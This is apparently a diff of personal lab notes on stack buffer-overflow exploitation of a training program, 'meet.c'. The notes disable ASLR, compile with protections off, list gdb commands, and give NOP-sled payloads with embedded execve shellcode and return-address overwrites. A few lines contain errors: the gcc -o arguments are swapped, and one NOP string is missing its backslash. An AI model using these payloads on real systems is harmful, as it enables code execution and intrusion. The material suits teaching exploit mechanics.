@@ -2,28 +2,29 @@
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space // To disable ASLR
 echo 2 | sudo tee /proc/sys/kernel/randomize_va_space // To enable ASLR
 
-gcc -g -o 'sourcefilename.c' 'outputfilename'  // g for debugging symbols and o for output filename
+sudo apt install gcc-multilib g++-multilib // To compile for 32 bit binary 
 
-gcc meet.c -o meet -mpreferred-stack-boundary=4 -fno-stack-protector -z execstack -g // for easy buffer overflow attack
+gcc -g -o 'sourcefilename.c' 'outputfilename'  // g for debugging symbols and o for output filename
+gcc meet.c -o meet -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -g -m32 // For 32 bit binary
+gcc meet.c -o meet -fno-stack-protector -z execstack -g // for easy buffer overflow attack -  default 64 -m64 can also be used
+
 
 gdb -q 'outputfilename' //q for not printing version
-
 run // to run the debugger
 q // to quit
 
-Control + L // To clear gdb sourcefilename
 
 info reg rip|pc
 info reg rbp|ebp
 info reg rsp|esp
+info frame
 
 set disassembly-flavor <intel/att>
 disassemble <function name>
-
 list
 
 x/400x $sp - 500 // Memmory data organised from low address to higher address Big Endian Form
-info frame
+
 
 run Mr `perl -e 'print "A" x 414'` //For buffer overflow attack 64 bit - 412 for 32bit
 run Mr `perl -e 'print "\x90" x 414'`
@@ -31,10 +32,14 @@ run Mr `perl -e 'print "\x90"x275';``cat sc``perl -e 'print "\xdc\xd5\xff\xff"x3
 run Mr `perl -e 'print "\x90"x233';``cat sc``perl -e 'print "\xe0\xe1\xff\xff\xff\x7f"x26';` //233 + 25 + 156(6*26) = 414
 
 run Mr `perl -e 'print "A" x 404'``perl -e 'print "B" x 4'``perl -e 'print "C" x 4'` //412 to overflow
-run Mr `perl -e 'print "x90" x 381'``\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05``perl -e 'print "\x41\x41\x41\x41"'` //381 + 27 + 4
+run Mr `perl -e 'print "x90" x 381'``\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05``perl -e 
+                'print "\x41\x41\x41\x41"'` //381 + 27 + 4
 
 
-run Mr $(python -c 'print "\x90" * 381 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41\x41\x41\x41" * 187')
+run Mr $(python -c 'print "\x90" * 381 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + 
+                   "\x41\x41\x41\x41" * 187')
 
 To overflow the buffer 
- [buffersize] + 8 + 6 
+ [buffersize] + 8 + 6 in bytes
+ 
+ 
